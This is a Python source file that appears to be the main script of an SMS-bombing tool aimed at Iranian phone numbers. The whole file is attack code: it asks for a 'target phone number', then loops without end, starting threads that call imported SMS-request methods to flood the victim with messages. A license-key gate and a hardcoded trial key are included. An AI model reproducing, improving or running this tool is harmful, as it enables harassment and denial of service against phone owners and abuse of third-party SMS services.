from os import system
from threading import Thread
from time import sleep
from utils import (
    output,
    prompt,
    is_iran_phone_number,
    generate_license_key,
    system_information,
    fg,
    style,
)
from methods import methods

system(r".venv\scripts\activate")


def send_sms(phone, sleep_time):
    try:
        for function in methods.values():
            try:
                Thread(target=function, args=[phone]).start()
            except:
                pass
            finally:
                sleep(sleep_time)
    except:
        pass


def get_information() -> list[str | float]:
    while True:
        phone_number = prompt(
            f"{fg.YELLOW}[{fg.GREEN}{style.BRIGHT}?{fg.YELLOW}] {fg.CYAN}Enter The Target Phone Number {fg.YELLOW}[{fg.GREEN}+98{fg.YELLOW}]{fg.BLUE}: {fg.MAGENTA}"
        )

        if is_iran_phone_number(phone_number):
            break
    try:
        sleep_time = float(
            prompt(
                f"{fg.YELLOW}[{fg.GREEN}{style.BRIGHT}?{fg.YELLOW}] {fg.CYAN}Enter Sleep Time Between Requests {fg.YELLOW}[{fg.GREEN}Default {fg.BLUE}= {fg.RED}1{fg.YELLOW}]{fg.BLUE}: {fg.MAGENTA}"
            )
        )
        output(f"{fg.MAGENTA}{f"{fg.RED}Script Activated{fg.MAGENTA}":-^20}")
    except ValueError:
        sleep_time = 1
        output(f"{fg.YELLOW}[{fg.GREEN}1{fg.YELLOW}] {fg.CYAN}Used")
        output(f"{fg.MAGENTA}{f"{fg.RED}Script Activated{fg.MAGENTA}":-^20}")

    return [phone_number, sleep_time]


def start_attack():
    """
    Start attacking to phone number
    """
    information = get_information()
    while True:
        try:
            send_sms(*information)
        except KeyboardInterrupt:
            output(
                f"{fg.YELLOW}[{fg.RED}-{fg.YELLOW}] {fg.RED}{style.BRIGHT}User Exited"
            )
            exit()
        except:
            output(
                f"{fg.YELLOW}[{fg.RED}-{fg.YELLOW}] {fg.RED}{style.BRIGHT}Error Timeout"
            )


def main():
    """
    Main runner
    """
    system_information()
    try:
        license_key = prompt(
            f"{fg.CYAN}Please enter your license key{fg.BLUE}: {fg.MAGENTA}"
        )
        if license_key == generate_license_key():
            start_attack()
        elif license_key == "1111-2222-3333-4444-5555-6666-7777-8888":
            output(
                f"{fg.YELLOW}[{fg.RED}Trial License{fg.YELLOW}] {fg.RED}{style.BRIGHT}Using trial license for test."
            )
            send_sms("+989123456789", 1)
        else:
            output(
                f"{fg.YELLOW}[{fg.RED}-{fg.YELLOW}] {fg.RED}{style.BRIGHT}Sorry the license key is incorrect."
            )
    except ValueError:
        output(
            f"{fg.YELLOW}[{fg.RED}-{fg.YELLOW}] {fg.RED}{style.BRIGHT}Sorry the license key is required."
        )


if __name__ == "__main__":
    main()
